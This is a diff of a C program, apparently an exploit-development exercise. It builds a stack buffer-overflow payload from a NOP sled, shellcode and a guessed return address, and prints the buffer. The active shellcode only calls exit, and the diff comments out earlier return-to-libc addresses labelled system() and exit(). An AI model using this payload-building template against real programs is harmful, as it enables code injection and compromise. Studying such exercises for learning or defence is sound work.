@@ -14,15 +14,19 @@
 #define DEFAULT_BUFFER_SIZE 512
 #define NOP 0x90
 
-char shellcode[] =
-    "\xd0\xbc\xe2\xf7\xff\x7f" // system()
-    "\xc0\x13\xe2\xf7\xff\x7f" // exit()
-    "\x1b\xe0\xff\xff\xff\x7f";
+// char shellcode2[] =
+//     "\xb8\x01\x00\x00\x00"
+//     "\xbb\x05\x00\x00\x00"
+//     "\xcd\x80";
 
-char shellcode2[] =
-    "\xb8\x01\x00\x00\x00"
-    "\xbb\x05\x00\x00\x00"
-    "\xcd\x80";
+// char shellcode[] =
+//     "\xd0\xbc\xe2\xf7\xff\x7f" // system()
+//     "\xc0\x13\xe2\xf7\xff\x7f" // exit()
+//     "\x1b\xe0\xff\xff\xff\x7f";
+
+unsigned char shellcode[] = "\xb0\x01"
+                            "\xb3\x05"
+                            "\xcd\x80";
 
 unsigned long *
 get_sp(void)
@@ -32,10 +36,12 @@ get_sp(void)
 
 int main(int argc, char *argv[])
 {
+
     char *buff, *ptr;
     unsigned long *addr_ptr, addr;
     int offset = DEFAULT_OFFSET, bsize = DEFAULT_BUFFER_SIZE;
     int i;
+    size_t shellcode_len = strlen(shellcode);
 
     if (argc > 1)
         bsize = atoi(argv[1]);
@@ -51,19 +57,20 @@ int main(int argc, char *argv[])
     addr = get_sp() - offset;
     fprintf(stderr, "Size of PTR: %ldb\n", sizeof(unsigned long *));
     fprintf(stderr, "Using address : 0x%lx\n", addr);
-    fprintf(stderr, "Shell code len %lu\n", strlen(shellcode2));
+    fprintf(stderr, "Shell code len %lu\n", shellcode_len);
     ptr = buff;
     addr_ptr = (unsigned long *)ptr;
+    // add noop instruction
     for (i = 0; i < bsize / 2; i++)
         *(ptr++) = NOP;
-    // ptr = buff + (bsize /2);
-    for (i = 0; i < (bsize - (bsize / 2) - (strlen(shellcode2))); i++)
-        *(ptr++) = 'A';
-    // ptr = buff + (bsize - (strlen(shellcode)));
-    for (i = 0; i < strlen(shellcode2); i++)
-        *(ptr++) = shellcode2[i];
+    // add padding
+    for (i = 0; i < (bsize - (bsize / 2) - (shellcode_len)); i++)
+        *(ptr++) = NOP;
+    // add shellcode
+    for (i = 0; i < shellcode_len; i++)
+        *(ptr++) = shellcode[i];
+    
+    // add jmo address
     *((unsigned long *)ptr) = addr;
-    // buff[bsize + 9 - 1] = '\0';
-    // memcpy(buff, "BUF=", 4);
     printf("%s", buff);
 }
